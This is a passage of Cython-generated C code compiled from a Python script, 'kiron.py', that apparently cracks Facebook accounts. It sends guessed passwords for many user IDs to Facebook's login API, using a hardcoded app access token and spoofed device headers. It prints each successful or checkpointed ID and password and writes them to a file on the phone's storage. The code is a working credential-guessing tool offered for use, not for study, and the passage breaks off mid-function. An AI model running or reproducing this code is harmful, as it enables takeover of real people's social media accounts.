        __pyx_t_11 = PyNumber_Add(__pyx_kp_s_https_api_facebook_com_method_au, __pyx_t_10); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = PyNumber_Add(__pyx_t_11, __pyx_kp_s_password); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_Str(__pyx_v_pw); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_13 = PyNumber_Add(__pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = PyNumber_Add(__pyx_t_13, __pyx_kp_s_credentials_type_device_based_l); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = PyTuple_New(1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_GIVEREF(__pyx_t_11);
        if (__Pyx_PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_11)) __PYX_ERR(0, 236, __pyx_L3_error);
        __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 236, __pyx_L3_error)
        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_13, __pyx_t_11); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_json); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 236, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = NULL;
        __pyx_t_4 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
            __pyx_t_4 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_10, NULL};
          __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_11, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 236, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_rp, __pyx_t_3);
        __pyx_t_3 = 0;

        /* "kiron.py":237
 *             "x-fb-http-engine": "Liger"}
 *             rp=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
 *             if "session_key" in rp:             # <<<<<<<<<<<<<<
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;244mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;244m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 */
        __pyx_t_14 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_v_rp, Py_EQ)); if (unlikely((__pyx_t_14 < 0))) __PYX_ERR(0, 237, __pyx_L3_error)
        if (__pyx_t_14) {

          /* "kiron.py":238
 *             rp=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
 *             if "session_key" in rp:
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;244mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;244m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")             # <<<<<<<<<<<<<<
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 cps.append(uid)
 */
          __pyx_t_3 = PyTuple_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 238, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_12 = 0;
          __pyx_t_9 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38);
          __pyx_t_12 += 56;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38);
          PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_38_5_244m_38_5_244mAYYUB_OK_38);
          __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_uid, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 238, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_9;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
          __Pyx_GIVEREF(__pyx_t_11);
          PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_11);
          __pyx_t_11 = 0;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_3);
          __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
          __pyx_t_12 += 24;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_3);
          PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_38_5_244m_38_5_46m_3);
          __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 238, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_9;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
          __Pyx_GIVEREF(__pyx_t_11);
          PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_11);
          __pyx_t_11 = 0;
          __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_3, 4, __pyx_t_12, __pyx_t_9); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 238, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 238, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":239
 *             if "session_key" in rp:
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;244mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;244m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")             # <<<<<<<<<<<<<<
 *                 cps.append(uid)
 *                 break
 */
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__31, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 239, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_write); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 239, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = PyNumber_Add(__pyx_v_uid, __pyx_kp_s__32); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 239, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = PyNumber_Add(__pyx_t_11, __pyx_v_pw); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 239, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = PyNumber_Add(__pyx_t_13, __pyx_kp_s__33); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 239, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_t_13 = NULL;
          __pyx_t_4 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_10))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_10);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_10, function);
              __pyx_t_4 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_13, __pyx_t_11};
            __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 239, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":240
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;244mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;244m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 cps.append(uid)             # <<<<<<<<<<<<<<
 *                 break
 *             elif "www.facebook.com" in rp["error_msg"]:
 */
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_cps); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 240, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_15 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_v_uid); if (unlikely(__pyx_t_15 == ((int)-1))) __PYX_ERR(0, 240, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":241
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 cps.append(uid)
 *                 break             # <<<<<<<<<<<<<<
 *             elif "www.facebook.com" in rp["error_msg"]:
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 */
          goto __pyx_L10_break;

          /* "kiron.py":237
 *             "x-fb-http-engine": "Liger"}
 *             rp=Session.get("https://api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20tly_logged_in_userid=0&method=GET&locale=en_GB&client_country_code=GB&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
 *             if "session_key" in rp:             # <<<<<<<<<<<<<<
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;244mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;244m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 */
        }

        /* "kiron.py":242
 *                 cps.append(uid)
 *                 break
 *             elif "www.facebook.com" in rp["error_msg"]:             # <<<<<<<<<<<<<<
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 */
        __pyx_t_3 = __Pyx_PyObject_Dict_GetItem(__pyx_v_rp, __pyx_n_s_error_msg); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 242, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_14 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_3, Py_EQ)); if (unlikely((__pyx_t_14 < 0))) __PYX_ERR(0, 242, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (__pyx_t_14) {

          /* "kiron.py":243
 *                 break
 *             elif "www.facebook.com" in rp["error_msg"]:
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")             # <<<<<<<<<<<<<<
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 oks.append(uid)
 */
          __pyx_t_3 = PyTuple_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 243, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_12 = 0;
          __pyx_t_9 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5);
          __pyx_t_12 += 54;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5);
          PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5);
          __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_uid, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 243, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_9;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_10);
          __pyx_t_10 = 0;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_3);
          __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
          __pyx_t_12 += 24;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_3);
          PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_38_5_244m_38_5_46m_3);
          __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 243, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_9;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_10);
          __pyx_t_10 = 0;
          __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_3, 4, __pyx_t_12, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 243, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_10); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 243, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":244
 *             elif "www.facebook.com" in rp["error_msg"]:
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")             # <<<<<<<<<<<<<<
 *                 oks.append(uid)
 *                 break
 */
          __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__31, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 244, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_write); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 244, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __pyx_t_10 = PyNumber_Add(__pyx_v_uid, __pyx_kp_s__32); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 244, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __pyx_t_13 = PyNumber_Add(__pyx_t_10, __pyx_v_pw); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 244, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
          __pyx_t_10 = PyNumber_Add(__pyx_t_13, __pyx_kp_s__33); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 244, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_t_13 = NULL;
          __pyx_t_4 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_11))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_11);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
              __Pyx_INCREF(__pyx_t_13);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_11, function);
              __pyx_t_4 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_13, __pyx_t_10};
            __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_11, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 244, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":245
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 oks.append(uid)             # <<<<<<<<<<<<<<
 *                 break
 *             elif "Please Confirm Email" in str(rp):
 */
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_oks); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 245, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_15 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_v_uid); if (unlikely(__pyx_t_15 == ((int)-1))) __PYX_ERR(0, 245, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":246
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 oks.append(uid)
 *                 break             # <<<<<<<<<<<<<<
 *             elif "Please Confirm Email" in str(rp):
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 */
          goto __pyx_L10_break;

          /* "kiron.py":242
 *                 cps.append(uid)
 *                 break
 *             elif "www.facebook.com" in rp["error_msg"]:             # <<<<<<<<<<<<<<
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 */
        }

        /* "kiron.py":247
 *                 oks.append(uid)
 *                 break
 *             elif "Please Confirm Email" in str(rp):             # <<<<<<<<<<<<<<
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 */
        __pyx_t_3 = __Pyx_PyObject_Str(__pyx_v_rp); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 247, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_14 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_Please_Confirm_Email, __pyx_t_3, Py_EQ)); if (unlikely((__pyx_t_14 < 0))) __PYX_ERR(0, 247, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        if (__pyx_t_14) {

          /* "kiron.py":248
 *                 break
 *             elif "Please Confirm Email" in str(rp):
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")             # <<<<<<<<<<<<<<
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")
 *                 oks.append(uid)
 */
          __pyx_t_3 = PyTuple_New(4); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 248, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_12 = 0;
          __pyx_t_9 = 127;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5);
          __pyx_t_12 += 54;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5);
          PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_kp_u_38_5_244m_38_5_46mAYYUB_OK_38_5);
          __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_uid, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 248, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_9;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
          __Pyx_GIVEREF(__pyx_t_11);
          PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_t_11);
          __pyx_t_11 = 0;
          __Pyx_INCREF(__pyx_kp_u_38_5_244m_38_5_46m_3);
          __pyx_t_9 = (65535 > __pyx_t_9) ? 65535 : __pyx_t_9;
          __pyx_t_12 += 24;
          __Pyx_GIVEREF(__pyx_kp_u_38_5_244m_38_5_46m_3);
          PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_kp_u_38_5_244m_38_5_46m_3);
          __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_pw, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 248, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_9;
          __pyx_t_12 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
          __Pyx_GIVEREF(__pyx_t_11);
          PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_t_11);
          __pyx_t_11 = 0;
          __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_3, 4, __pyx_t_12, __pyx_t_9); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 248, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_11); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 248, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "kiron.py":249
 *             elif "Please Confirm Email" in str(rp):
 *                 print(f"\r\x1b[38;5;244m[\x1b[38;5;46mAYYUB-OK\x1b[38;5;244m]\x1b[38;5;46m {uid} \x1b[38;5;244m\x1b[38;5;46m {pw}")
 *                 open("/sdcard/AYYUB-OLD.txt","a").write(uid+"|"+pw+"\n")             # <<<<<<<<<<<<<<
 *                 oks.append(uid)
 *                 break
 */
          __pyx_t_11 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__31, NULL); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 249, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_write); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 249, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_10);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = PyNumber_Add(__pyx_v_uid, __pyx_kp_s__32); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 249, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = PyNumber_Add(__pyx_t_11, __pyx_v_pw); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 249, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = PyNumber_Add(__pyx_t_13, __pyx_kp_s__33); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 249, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
          __pyx_t_13 = NULL;
          __pyx_t_4 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_10))) {
            __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_10);
            if (likely(__pyx_t_13)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
